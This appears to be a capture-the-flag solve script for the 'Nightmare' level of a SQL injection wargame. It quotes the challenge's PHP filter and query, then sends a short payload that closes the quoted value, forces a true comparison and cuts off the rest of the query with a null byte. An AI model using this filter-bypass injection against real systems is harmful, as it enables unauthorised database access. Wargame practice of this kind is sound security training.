#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Nightmare

    if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
    $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) solve("nightmare");
    '''

    url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    param = dict(pw="')=0;" + chr(0))

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Nightmare Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()

